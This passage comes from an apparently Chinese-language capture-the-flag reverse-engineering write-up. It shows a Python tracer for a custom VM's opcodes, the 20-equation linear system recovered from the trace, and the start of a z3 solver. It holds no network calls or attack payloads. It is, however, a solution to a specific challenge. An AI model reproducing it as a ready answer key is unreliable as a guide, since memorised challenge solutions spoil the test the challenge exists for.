class="number">0</span>]]) + <span class="string">&quot;, &quot;</span>)</span><br><span class="line">                    count += <span class="number">1</span></span><br><span class="line">                    all_memory[unpack(<span class="string">&quot;&lt;I&quot;</span>, now_op[<span class="number">0</span>:<span class="number">4</span>])[<span class="number">0</span>]] = all_memory[unpack(<span class="string">&quot;&lt;I&quot;</span>, now_op[<span class="number">4</span>:<span class="number">8</span>])[<span class="number">0</span>]] * all_memory[unpack(<span class="string">&quot;&lt;I&quot;</span>, now_op[<span class="number">8</span>:<span class="number">12</span>])[<span class="number">0</span>]]</span><br><span class="line">                    now_op = opcode_file.read(<span class="number">4</span>)</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                <span class="keyword">if</span> unpack(<span class="string">&quot;&lt;I&quot;</span>, now_op)[<span class="number">0</span>] == <span class="number">4</span>:</span><br><span class="line">                    now_op = opcode_file.read(<span class="number">3</span> * <span class="number">4</span>)</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;mem[&quot;</span> + <span class="built_in">str</span>(unpack(<span class="string">&quot;&lt;I&quot;</span>, (now_op[<span class="number">0</span>:<span class="number">4</span>]))[<span class="number">0</span>]) + <span class="string">&quot;] = mem[&quot;</span> + <span class="built_in">str</span>(unpack(<span class="string">&quot;&lt;I&quot;</span>, now_op[<span class="number">4</span>:<span class="number">8</span>])[<span class="number">0</span>]) + <span class="string">&quot;] / mem[&quot;</span> + <span class="built_in">str</span>(unpack(<span class="string">&quot;&lt;I&quot;</span>, now_op[<span class="number">8</span>:<span class="number">12</span>])[<span class="number">0</span>]) + <span class="string">&quot;]&quot;</span>)</span><br><span class="line">                    opcode.write(<span class="string">&quot;mem[&quot;</span> + <span class="built_in">str</span>(unpack(<span class="string">&quot;&lt;I&quot;</span>, (now_op[<span class="number">0</span>:<span class="number">4</span>]))[<span class="number">0</span>]) + <span class="string">&quot;] = mem[&quot;</span> + <span class="built_in">str</span>(unpack(<span class="string">&quot;&lt;I&quot;</span>, now_op[<span class="number">4</span>:<span class="number">8</span>])[<span class="number">0</span>]) + <span class="string">&quot;] / mem[&quot;</span> + <span class="built_in">str</span>(unpack(<span class="string">&quot;&lt;I&quot;</span>, now_op[<span class="number">8</span>:<span class="number">12</span>])[<span class="number">0</span>]) + <span class="string">&quot;]\n&quot;</span>)</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;mem[&quot;</span> + <span class="built_in">str</span>(unpack(<span class="string">&quot;&lt;I&quot;</span>, now_op[<span class="number">0</span>:<span class="number">4</span>])[<span class="number">0</span>]) + <span class="string">&quot;] = &quot;</span> + <span class="built_in">str</span>(all_memory[unpack(<span class="string">&quot;&lt;I&quot;</span>, now_op[<span class="number">0</span>:<span class="number">4</span>])[<span class="number">0</span>]]), end = <span class="string">&quot;, &quot;</span>)</span><br><span class="line">                    opcode.write(<span class="string">&quot;mem[&quot;</span> + <span class="built_in">str</span>(unpack(<span class="string">&quot;&lt;I&quot;</span>, now_op[<span class="number">0</span>:<span class="number">4</span>])[<span class="number">0</span>]) + <span class="string">&quot;] = &quot;</span> + <span class="built_in">str</span>(all_memory[unpack(<span class="string">&quot;&lt;I&quot;</span>, now_op[<span class="number">0</span>:<span class="number">4</span>])[<span class="number">0</span>]]) + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;mem[&quot;</span> + <span class="built_in">str</span>(unpack(<span class="string">&quot;&lt;I&quot;</span>, now_op[<span class="number">4</span>:<span class="number">8</span>])[<span class="number">0</span>]) + <span class="string">&quot;] = &quot;</span> + <span class="built_in">str</span>(all_memory[unpack(<span class="string">&quot;&lt;I&quot;</span>, now_op[<span class="number">4</span>:<span class="number">8</span>])[<span class="number">0</span>]]), end = <span class="string">&quot;, &quot;</span>)</span><br><span class="line">                    opcode.write(<span class="string">&quot;mem[&quot;</span> + <span class="built_in">str</span>(unpack(<span class="string">&quot;&lt;I&quot;</span>, now_op[<span class="number">4</span>:<span class="number">8</span>])[<span class="number">0</span>]) + <span class="string">&quot;] = &quot;</span> + <span class="built_in">str</span>(all_memory[unpack(<span class="string">&quot;&lt;I&quot;</span>, now_op[<span class="number">4</span>:<span class="number">8</span>])[<span class="number">0</span>]]) + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;mem[&quot;</span> + <span class="built_in">str</span>(unpack(<span class="string">&quot;&lt;I&quot;</span>, now_op[<span class="number">8</span>:<span class="number">12</span>])[<span class="number">0</span>]) + <span class="string">&quot;] = &quot;</span> + <span class="built_in">str</span>(all_memory[unpack(<span class="string">&quot;&lt;I&quot;</span>, now_op[<span class="number">8</span>:<span class="number">12</span>])[<span class="number">0</span>]]))</span><br><span class="line">                    opcode.write(<span class="string">&quot;mem[&quot;</span> + <span class="built_in">str</span>(unpack(<span class="string">&quot;&lt;I&quot;</span>, now_op[<span class="number">8</span>:<span class="number">12</span>])[<span class="number">0</span>]) + <span class="string">&quot;] = &quot;</span> + <span class="built_in">str</span>(all_memory[unpack(<span class="string">&quot;&lt;I&quot;</span>, now_op[<span class="number">8</span>:<span class="number">12</span>])[<span class="number">0</span>]]) + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">                    all_memory[unpack(<span class="string">&quot;&lt;I&quot;</span>, now_op[<span class="number">0</span>:<span class="number">4</span>])[<span class="number">0</span>]] = all_memory[unpack(<span class="string">&quot;&lt;I&quot;</span>, now_op[<span class="number">4</span>:<span class="number">8</span>])[<span class="number">0</span>]] / all_memory[unpack(<span class="string">&quot;&lt;I&quot;</span>, now_op[<span class="number">8</span>:<span class="number">12</span>])[<span class="number">0</span>]]</span><br><span class="line">                    now_op = opcode_file.read(<span class="number">4</span>)</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                <span class="comment">#reset the in pointer</span></span><br><span class="line">                <span class="keyword">if</span> unpack(<span class="string">&quot;&lt;I&quot;</span>, now_op)[<span class="number">0</span>] == <span class="number">5</span>:</span><br><span class="line">                    in_pointer = <span class="number">0</span></span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;in_pointer = 0&quot;</span>)</span><br><span class="line">                    opcode.write(<span class="string">&quot;in_pointer = 0\n&quot;</span>)</span><br><span class="line">                    now_op = opcode_file.read(<span class="number">4</span>)</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                <span class="comment">#reset the out pointer</span></span><br><span class="line">                <span class="keyword">if</span> unpack(<span class="string">&quot;&lt;I&quot;</span>, now_op)[<span class="number">0</span>] == <span class="number">6</span>:</span><br><span class="line">                    out_pointer = <span class="number">0</span></span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;out_pointer = 0&quot;</span>)</span><br><span class="line">                    opcode.write(<span class="string">&quot;out_pointer = 0\n&quot;</span>)</span><br><span class="line">                    now_op = opcode_file.read(<span class="number">4</span>)</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                <span class="comment">#pop-in</span></span><br><span class="line">                <span class="keyword">if</span> unpack(<span class="string">&quot;&lt;I&quot;</span>, now_op)[<span class="number">0</span>] == <span class="number">7</span>:</span><br><span class="line">                    now_op = opcode_file.read(<span class="number">4</span>)</span><br><span class="line">                    arg = opcode_file.read(<span class="number">4</span>)</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;from input[&quot;</span> + <span class="built_in">hex</span>(in_pointer) + <span class="string">&quot;] copy &quot;</span> + <span class="built_in">str</span>(unpack(<span class="string">&quot;&lt;I&quot;</span>, arg)[<span class="number">0</span>]) + <span class="string">&quot; bytes to mem[&quot;</span> + <span class="built_in">str</span>(unpack(<span class="string">&quot;&lt;I&quot;</span>, now_op)[<span class="number">0</span>]) + <span class="string">&quot;]&quot;</span>)</span><br><span class="line">                    opcode.write(<span class="string">&quot;from input[&quot;</span> + <span class="built_in">hex</span>(in_pointer) + <span class="string">&quot;] copy &quot;</span> + <span class="built_in">str</span>(unpack(<span class="string">&quot;&lt;I&quot;</span>, arg)[<span class="number">0</span>]) + <span class="string">&quot; bytes to mem[&quot;</span> + <span class="built_in">str</span>(unpack(<span class="string">&quot;&lt;I&quot;</span>, now_op)[<span class="number">0</span>]) + <span class="string">&quot;]\n&quot;</span>)</span><br><span class="line">                    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(unpack(<span class="string">&quot;&lt;I&quot;</span>, arg)[<span class="number">0</span>]):</span><br><span class="line">                        <span class="keyword">try</span>:</span><br><span class="line">                            all_memory[unpack(<span class="string">&quot;&lt;I&quot;</span>, now_op)[<span class="number">0</span>] + i] = input_text[in_pointer]</span><br><span class="line">                            in_pointer += <span class="number">1</span></span><br><span class="line">                        <span class="keyword">except</span>:</span><br><span class="line">                            <span class="keyword">break</span></span><br><span class="line">                    now_op = opcode_file.read(<span class="number">4</span>)</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                <span class="comment">#pop-out</span></span><br><span class="line">                <span class="keyword">if</span> unpack(<span class="string">&quot;&lt;I&quot;</span>, now_op)[<span class="number">0</span>] == <span class="number">8</span>:</span><br><span class="line">                    now_op = opcode_file.read(<span class="number">4</span>)</span><br><span class="line">                    arg = opcode_file.read(<span class="number">4</span>)</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;from mem[&quot;</span> + <span class="built_in">str</span>(unpack(<span class="string">&quot;&lt;I&quot;</span>, now_op)[<span class="number">0</span>]) + <span class="string">&quot;] copy &quot;</span> + <span class="built_in">str</span>(unpack(<span class="string">&quot;&lt;I&quot;</span>, arg)[<span class="number">0</span>]) + <span class="string">&quot; bytes to output[&quot;</span> + <span class="built_in">hex</span>(out_pointer) + <span class="string">&quot;]&quot;</span>)</span><br><span class="line">                    opcode.write(<span class="string">&quot;from mem[&quot;</span> + <span class="built_in">str</span>(unpack(<span class="string">&quot;&lt;I&quot;</span>, now_op)[<span class="number">0</span>]) + <span class="string">&quot;] copy &quot;</span> + <span class="built_in">str</span>(unpack(<span class="string">&quot;&lt;I&quot;</span>, arg)[<span class="number">0</span>]) + <span class="string">&quot; bytes to output[&quot;</span> + <span class="built_in">hex</span>(out_pointer) + <span class="string">&quot;]\n&quot;</span>)</span><br><span class="line">                    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(unpack(<span class="string">&quot;&lt;I&quot;</span>, arg)[<span class="number">0</span>]):</span><br><span class="line">                        output_text.append(all_memory[unpack(<span class="string">&quot;&lt;I&quot;</span>, now_op)[<span class="number">0</span>] + i])</span><br><span class="line">                        out_pointer += <span class="number">1</span></span><br><span class="line">                    now_op = opcode_file.read(<span class="number">4</span>)</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                <span class="comment">#read_buffer</span></span><br><span class="line">                <span class="keyword">if</span> unpack(<span class="string">&quot;&lt;I&quot;</span>, now_op)[<span class="number">0</span>] == <span class="number">9</span>:</span><br><span class="line">                    now_op = opcode_file.read(<span class="number">4</span>)</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;get_user_input and write in&quot;</span>, unpack(<span class="string">&quot;&lt;I&quot;</span>, now_op)[<span class="number">0</span>])</span><br><span class="line">                    opcode.write(<span class="string">&quot;get_user_input and write in &quot;</span> + <span class="built_in">str</span>(unpack(<span class="string">&quot;&lt;I&quot;</span>, now_op)[<span class="number">0</span>]) + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">                    input_text = [<span class="built_in">ord</span>(c) <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">input</span>()]</span><br><span class="line">                    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(input_text)):</span><br><span class="line">                        all_memory[unpack(<span class="string">&quot;&lt;I&quot;</span>, now_op)[<span class="number">0</span>] + i] = input_text[i]</span><br><span class="line">                    now_op = opcode_file.read(<span class="number">4</span>)</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                <span class="comment">#write_buffer</span></span><br><span class="line">                <span class="keyword">if</span> unpack(<span class="string">&quot;&lt;I&quot;</span>, now_op)[<span class="number">0</span>] == <span class="number">10</span>:</span><br><span class="line">                    now_op = opcode_file.read(<span class="number">4</span>)</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;print signal(correct or not)&quot;</span>)</span><br><span class="line">                    opcode.write(<span class="string">&quot;print signal(correct or not)\n&quot;</span>)</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;&quot;</span>.join([<span class="built_in">chr</span>(c) <span class="keyword">for</span> c <span class="keyword">in</span> output_text]))</span><br><span class="line">                    opcode.write(<span class="string">&quot;&quot;</span>.join([<span class="built_in">chr</span>(c) <span class="keyword">for</span> c <span class="keyword">in</span> output_text]) + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">                    now_op = opcode_file.read(<span class="number">4</span>)</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                <span class="comment">#jump</span></span><br><span class="line">                <span class="keyword">if</span> unpack(<span class="string">&quot;&lt;I&quot;</span>, now_op)[<span class="number">0</span>] == <span class="number">11</span>:</span><br><span class="line">                    now_op = opcode_file.read(<span class="number">4</span>)</span><br><span class="line">                    arg = opcode_file.read(<span class="number">4</span>)</span><br><span class="line">                    now_mem = all_memory[unpack(<span class="string">&quot;&lt;I&quot;</span>, arg)[<span class="number">0</span>]]</span><br><span class="line">                    <span class="comment"># if (arg and not(now_mem)):</span></span><br><span class="line">                    <span class="comment">#     print(&quot;goto &quot; + hex(unpack(&quot;&lt;I&quot;, now_op)[0]))</span></span><br><span class="line">                    <span class="comment">#     opcode_file.seek(unpack(&quot;&lt;I&quot;, now_op)[0])</span></span><br><span class="line">                    <span class="comment">#     now_op = opcode_file.read(4)</span></span><br><span class="line">                    <span class="comment">#     continue</span></span><br><span class="line">                    <span class="comment"># else:</span></span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;not jump&quot;</span>)</span><br><span class="line">                    opcode.write(<span class="string">&quot;not jump\n&quot;</span>)</span><br><span class="line">                    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(unpack(<span class="string">&quot;&lt;I&quot;</span>, now_op)[<span class="number">0</span>] - <span class="number">1</span>):</span><br><span class="line">                        now_op = opcode_file.read(<span class="number">4</span>)</span><br><span class="line">                    now_op = opcode_file.read(<span class="number">4</span>)</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                <span class="comment">#not-jump</span></span><br><span class="line">                <span class="keyword">if</span> unpack(<span class="string">&quot;&lt;I&quot;</span>, now_op)[<span class="number">0</span>] == <span class="number">12</span>:</span><br><span class="line">                    now_op = opcode_file.read(<span class="number">4</span>)</span><br><span class="line">                    arg = opcode_file.read(<span class="number">4</span>)</span><br><span class="line">                    now_mem = all_memory[unpack(<span class="string">&quot;&lt;I&quot;</span>, arg)[<span class="number">0</span>]]</span><br><span class="line">                    <span class="comment"># if (arg and (now_mem)):</span></span><br><span class="line">                    <span class="comment">#     print(&quot;goto &quot; + hex(unpack(&quot;&lt;I&quot;, now_op)[0]))</span></span><br><span class="line">                    <span class="comment">#     opcode_file.seek(unpack(&quot;&lt;I&quot;, now_op)[0])</span></span><br><span class="line">                    <span class="comment">#     now_op = opcode_file.read(4)</span></span><br><span class="line">                    <span class="comment">#     continue</span></span><br><span class="line">                    <span class="comment"># else:</span></span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;not jump&quot;</span>)</span><br><span class="line">                    opcode.write(<span class="string">&quot;not jump\n&quot;</span>)</span><br><span class="line">                    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(unpack(<span class="string">&quot;&lt;I&quot;</span>, now_op)[<span class="number">0</span>] - <span class="number">2</span>):</span><br><span class="line">                        now_op = opcode_file.read(<span class="number">4</span>)</span><br><span class="line">                    now_op = opcode_file.read(<span class="number">4</span>)</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                <span class="comment">#get-lenth-of-input</span></span><br><span class="line">                <span class="keyword">if</span> unpack(<span class="string">&quot;&lt;I&quot;</span>, now_op)[<span class="number">0</span>] == <span class="number">13</span>:</span><br><span class="line">                    now_op = opcode_file.read(<span class="number">4</span>)</span><br><span class="line">                    arg = opcode_file.read(<span class="number">4</span>)</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;mem[&quot;</span> + <span class="built_in">str</span>(unpack(<span class="string">&quot;&lt;I&quot;</span>, arg)[<span class="number">0</span>]) + <span class="string">&quot;] = len(mem[&quot;</span> + <span class="built_in">str</span>(unpack(<span class="string">&quot;&lt;I&quot;</span>, now_op)[<span class="number">0</span>]) +<span class="string">&quot;])&quot;</span>)</span><br><span class="line">                    opcode.write(<span class="string">&quot;mem[&quot;</span> + <span class="built_in">str</span>(unpack(<span class="string">&quot;&lt;I&quot;</span>, arg)[<span class="number">0</span>]) + <span class="string">&quot;] = len(mem[&quot;</span> + <span class="built_in">str</span>(unpack(<span class="string">&quot;&lt;I&quot;</span>, now_op)[<span class="number">0</span>]) +<span class="string">&quot;])\n&quot;</span>)</span><br><span class="line">                    all_memory[unpack(<span class="string">&quot;&lt;I&quot;</span>, arg)[<span class="number">0</span>]] = <span class="built_in">len</span>(input_text)</span><br><span class="line">                    now_op = opcode_file.read(<span class="number">4</span>)</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;error&quot;</span>)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                        </span><br></pre></td></tr></table></figure>

<p>这里对所有flag错误导致的跳转进行剪枝 让虚拟机一直跑到结束以获得完整的运行过程 发现是用输入的20个字节构造20元方程组(所以这里的输出op的脚本进行了简化 只输出每一项的系数和0次项) 得到增广矩阵:</p>
<figure class="highlight tex"><table><tr><td class="code"><pre><span class="line">key[0][0] == 115, key[0][1] == 26, key[0][2] == 128, key[0][3] == 200, key[0][4] == 21, key[0][5] == 234, key[0][6] == 172, key[0][7] == 152, key[0][8] == 39, key[0][9] == 71, key[0][10] == 55, key[0][11] == 28, key[0][12] == 105, key[0][13] == 42, key[0][14] == 75, key[0][15] == 63, key[0][16] == 114, key[0][17] == 205, key[0][18] == 2, key[0][19] == 222, sum[0] == 217114</span><br><span class="line">not jump</span><br><span class="line">key[1][0] == 212, key[1][1] == 148, key[1][2] == 17, key[1][3] == 74, key[1][4] == 87, key[1][5] == 253, key[1][6] == 250, key[1][7] == 136, key[1][8] == 89, key[1][9] == 211, key[1][10] == 49, key[1][11] == 26, key[1][12] == 115, key[1][13] == 88, key[1][14] == 181, key[1][15] == 195, key[1][16] == 237, key[1][17] == 10, key[1][18] == 119, key[1][19] == 121, sum[1] == 270581</span><br><span class="line">not jump</span><br><span class="line">key[2][0] == 229, key[2][1] == 172, key[2][2] == 230, key[2][3] == 123, key[2][4] == 245, key[2][5] == 127, key[2][6] == 119, key[2][7] == 157, key[2][8] == 208, key[2][9] == 159, key[2][10] == 37, key[2][11] == 32, key[2][12] == 5, key[2][13] == 207, key[2][14] == 145, key[2][15] == 75, key[2][16] == 251, key[2][17] == 60, key[2][18] == 135, key[2][19] == 125, sum[2] == 291585</span><br><span class="line">not jump</span><br><span class="line">key[3][0] == 181, key[3][1] == 83, key[3][2] == 66, key[3][3] == 43, key[3][4] == 85, key[3][5] == 198, key[3][6] == 89, key[3][7] == 205, key[3][8] == 114, key[3][9] == 221, key[3][10] == 105, key[3][11] == 145, key[3][12] == 155, key[3][13] == 91, key[3][14] == 123, key[3][15] == 48, key[3][16] == 76, key[3][17] == 64, key[3][18] == 141, key[3][19] == 22, sum[3] == 234325</span><br><span class="line">not jump</span><br><span class="line">key[4][0] == 211, key[4][1] == 225, key[4][2] == 204, key[4][3] == 55, key[4][4] == 107, key[4][5] == 76, key[4][6] == 7, key[4][7] == 39, key[4][8] == 199, key[4][9] == 84, key[4][10] == 167, key[4][11] == 62, key[4][12] == 219, key[4][13] == 54, key[4][14] == 6, key[4][15] == 144, key[4][16] == 55, key[4][17] == 98, key[4][18] == 186, key[4][19] == 116, sum[4] == 240502</span><br><span class="line">not jump</span><br><span class="line">key[5][0] == 149, key[5][1] == 163, key[5][2] == 127, key[5][3] == 186, key[5][4] == 46, key[5][5] == 118, key[5][6] == 247, key[5][7] == 194, key[5][8] == 9, key[5][9] == 165, key[5][10] == 169, key[5][11] == 224, key[5][12] == 68, key[5][13] == 129, key[5][14] == 54, key[5][15] == 15, key[5][16] == 134, key[5][17] == 39, key[5][18] == 185, key[5][19] == 248, sum[5] == 277604</span><br><span class="line">not jump</span><br><span class="line">key[6][0] == 245, key[6][1] == 159, key[6][2] == 64, key[6][3] == 241, key[6][4] == 163, key[6][5] == 116, key[6][6] == 4, key[6][7] == 15, key[6][8] == 126, key[6][9] == 170, key[6][10] == 10, key[6][11] == 110, key[6][12] == 251, key[6][13] == 169, key[6][14] == 252, key[6][15] == 99, key[6][16] == 199, key[6][17] == 188, key[6][18] == 149, key[6][19] == 72, sum[6] == 286168</span><br><span class="line">not jump</span><br><span class="line">key[7][0] == 233, key[7][1] == 38, key[7][2] == 197, key[7][3] == 105, key[7][4] == 202, key[7][5] == 2, key[7][6] == 22, key[7][7] == 225, key[7][8] == 189, key[7][9] == 166, key[7][10] == 239, key[7][11] == 220, key[7][12] == 70, key[7][13] == 98, key[7][14] == 194, key[7][15] == 129, key[7][16] == 27, key[7][17] == 236, key[7][18] == 159, key[7][19] == 62, sum[7] == 290450</span><br><span class="line">not jump</span><br><span class="line">key[8][0] == 152, key[8][1] == 67, key[8][2] == 72, key[8][3] == 35, key[8][4] == 12, key[8][5] == 55, key[8][6] == 139, key[8][7] == 4, key[8][8] == 169, key[8][9] == 142, key[8][10] == 135, key[8][11] == 122, key[8][12] == 3, key[8][13] == 166, key[8][14] == 139, key[8][15] == 62, key[8][16] == 23, key[8][17] == 92, key[8][18] == 11, key[8][19] == 136, sum[8] == 179355</span><br><span class="line">not jump</span><br><span class="line">key[9][0] == 96, key[9][1] == 141, key[9][2] == 38, key[9][3] == 124, key[9][4] == 139, key[9][5] == 43, key[9][6] == 15, key[9][7] == 119, key[9][8] == 30, key[9][9] == 252, key[9][10] == 255, key[9][11] == 123, key[9][12] == 223, key[9][13] == 200, key[9][14] == 21, key[9][15] == 117, key[9][16] == 231, key[9][17] == 9, key[9][18] == 239, key[9][19] == 222, sum[9] == 272487</span><br><span class="line">not jump</span><br><span class="line">key[10][0] == 249, key[10][1] == 91, key[10][2] == 66, key[10][3] == 21, key[10][4] == 121, key[10][5] == 146, key[10][6] == 5, key[10][7] == 180, key[10][8] == 6, key[10][9] == 80, key[10][10] == 112, key[10][11] == 255, key[10][12] == 239, key[10][13] == 17, key[10][14] == 39, key[10][15] == 254, key[10][16] == 153, key[10][17] == 118, key[10][18] == 47, key[10][19] == 217, sum[10] == 249816</span><br><span class="line">not jump</span><br><span class="line">key[11][0] == 84, key[11][1] == 96, key[11][2] == 190, key[11][3] == 188, key[11][4] == 255, key[11][5] == 181, key[11][6] == 188, key[11][7] == 124, key[11][8] == 47, key[11][9] == 70, key[11][10] == 201, key[11][11] == 160, key[11][12] == 126, key[11][13] == 210, key[11][14] == 236, key[11][15] == 22, key[11][16] == 120, key[11][17] == 181, key[11][18] == 197, key[11][19] == 69, sum[11] == 305636</span><br><span class="line">not jump</span><br><span class="line">key[12][0] == 51, key[12][1] == 173, key[12][2] == 216, key[12][3] == 143, key[12][4] == 41, key[12][5] == 174, key[12][6] == 184, key[12][7] == 189, key[12][8] == 111, key[12][9] == 133, key[12][10] == 79, key[12][11] == 36, key[12][12] == 99, key[12][13] == 140, key[12][14] == 120, key[12][15] == 144, key[12][16] == 80, key[12][17] == 231, key[12][18] == 187, key[12][19] == 107, sum[12] == 276217</span><br><span class="line">not jump</span><br><span class="line">key[13][0] == 173, key[13][1] == 39, key[13][2] == 151, key[13][3] == 161, key[13][4] == 139, key[13][5] == 233, key[13][6] == 143, key[13][7] == 205, key[13][8] == 170, key[13][9] == 125, key[13][10] == 209, key[13][11] == 54, key[13][12] == 128, key[13][13] == 134, key[13][14] == 55, key[13][15] == 246, key[13][16] == 157, key[13][17] == 57, key[13][18] == 42, key[13][19] == 195, sum[13] == 294166</span><br><span class="line">not jump</span><br><span class="line">key[14][0] == 5, key[14][1] == 49, key[14][2] == 235, key[14][3] == 8, key[14][4] == 84, key[14][5] == 9, key[14][6] == 219, key[14][7] == 90, key[14][8] == 109, key[14][9] == 164, key[14][10] == 38, key[14][11] == 159, key[14][12] == 218, key[14][13] == 214, key[14][14] == 22, key[14][15] == 205, key[14][16] == 7, key[14][17] == 57, key[14][18] == 210, key[14][19] == 131, sum[14] == 237236</span><br><span class="line">not jump</span><br><span class="line">key[15][0] == 107, key[15][1] == 67, key[15][2] == 107, key[15][3] == 141, key[15][4] == 129, key[15][5] == 250, key[15][6] == 97, key[15][7] == 3, key[15][8] == 26, key[15][9] == 215, key[15][10] == 119, key[15][11] == 213, key[15][12] == 255, key[15][13] == 183, key[15][14] == 229, key[15][15] == 1, key[15][16] == 27, key[15][17] == 9, key[15][18] == 88, key[15][19] == 59, sum[15] == 242008</span><br><span class="line">not jump</span><br><span class="line">key[16][0] == 57, key[16][1] == 72, key[16][2] == 91, key[16][3] == 96, key[16][4] == 125, key[16][5] == 105, key[16][6] == 94, key[16][7] == 235, key[16][8] == 138, key[16][9] == 39, key[16][10] == 145, key[16][11] == 130, key[16][12] == 126, key[16][13] == 147, key[16][14] == 254, key[16][15] == 179, key[16][16] == 181, key[16][17] == 183, key[16][18] == 216, key[16][19] == 211, sum[16] == 289929</span><br><span class="line">not jump</span><br><span class="line">key[17][0] == 164, key[17][1] == 205, key[17][2] == 28, key[17][3] == 160, key[17][4] == 233, key[17][5] == 70, key[17][6] == 109, key[17][7] == 51, key[17][8] == 0, key[17][9] == 71, key[17][10] == 99, key[17][11] == 163, key[17][12] == 37, key[17][13] == 98, key[17][14] == 46, key[17][15] == 44, key[17][16] == 138, key[17][17] == 135, key[17][18] == 191, key[17][19] == 144, sum[17] == 221788</span><br><span class="line">not jump</span><br><span class="line">key[18][0] == 13, key[18][1] == 240, key[18][2] == 143, key[18][3] == 53, key[18][4] == 75, key[18][5] == 23, key[18][6] == 26, key[18][7] == 224, key[18][8] == 31, key[18][9] == 199, key[18][10] == 182, key[18][11] == 220, key[18][12] == 130, key[18][13] == 61, key[18][14] == 170, key[18][15] == 130, key[18][16] == 253, key[18][17] == 240, key[18][18] == 182, key[18][19] == 9, sum[18] == 268459</span><br><span class="line">not jump</span><br><span class="line">key[19][0] == 245, key[19][1] == 96, key[19][2] == 170, key[19][3] == 79, key[19][4] == 249, key[19][5] == 16, key[19][6] == 121, key[19][7] == 6, key[19][8] == 7, key[19][9] == 69, key[19][10] == 212, key[19][11] == 133, key[19][12] == 52, key[19][13] == 20, key[19][14] == 225, key[19][15] == 102, key[19][16] == 228, key[19][17] == 121, key[19][18] == 56, key[19][19] == 208, sum[19] == 247407</span><br></pre></td></tr></table></figure>

<p>用z3解该方程组(建议使用z3++ python效率太低<del>但是谁让我不会呢</del>)</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">flag = [Int(<span class="string">&quot;flag_%s&quot;</span> % i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>)]</span><br><span class="line">key = [[Int(<span class="string">&quot;key_%d_%d&quot;</span> % (i, j)) <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>)] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>)]</span><br><span class="line"><span class="built_in">sum</span> = [Int(<span class="string">&#x27;sum_%d&#x27;</span> % i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>)]</span><br><span class="line">s = Solver()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">    s.add(<span class="built_in">sum</span>[i] == <span class="number">0</span>)</span><br><span class="line">s.add(key[<span class="number">0</span>][<span class="number">0</span>] == <span class="number">115</span>, key[<span class="number">0</span>][<span class="number">1</span>] == <span class="number">26</span>, key[<span class="number">0</span>][<span class="number">2</span>] == <span class="number">128</span>, key[<span class="number">0</span>][<span class="number">3</span>] == <span class="number">200</span>, key[<span class="number">0</span>][<span class="number">4</span>] == <span class="number">21</span>, key[<span class="number">0</span>][<span class="number">5</span>] == <span class="number">234</span>, key[<span class="number">0</span>][<span class="number">6</span>] == <span class="number">172</span>, key[<span class="number">0</span>][<span class="number">7</span>] == <span class="number">152</span>, key[<span class="number">0</span>][<span class="number">8</span>] == <span class="number">39</span>, key[<span class="number">0</span>][<span class="number">9</span>] == <span class="number">71</span>, key[<span class="number">0</span>][<span class="number">10</span>] == <span class="number">55</span>, key[<span class="number">0</span>][<span class="number">11</span>] == <span class="number">28</span>, key[<span class="number">0</span>][<span class="number">12</span>] == <span class="number">105</span>, key[<span class="number">0</span>][<span class="number">13</span>] == <span class="number">42</span>, key[<span class="number">0</span>][<span class="number">14</span>] == <span class="number">75</span>, key[<span class="number">0</span>][<span class="number">15</span>] == <span class="number">63</span>, key[<span class="number">0</span>][<span class="number">16</span>] == <span class="number">114</span>, key[<span class="number">0</span>][<span class="number">17</span>] == <span class="number">205</span>, key[<span class="number">0</span>][<span class="number">18</span>] == <span class="number">2</span>, key[<span class="number">0</span>][<span class="number">19</span>] == <span class="number">222</span>, </span><br><span class="line">key[<span 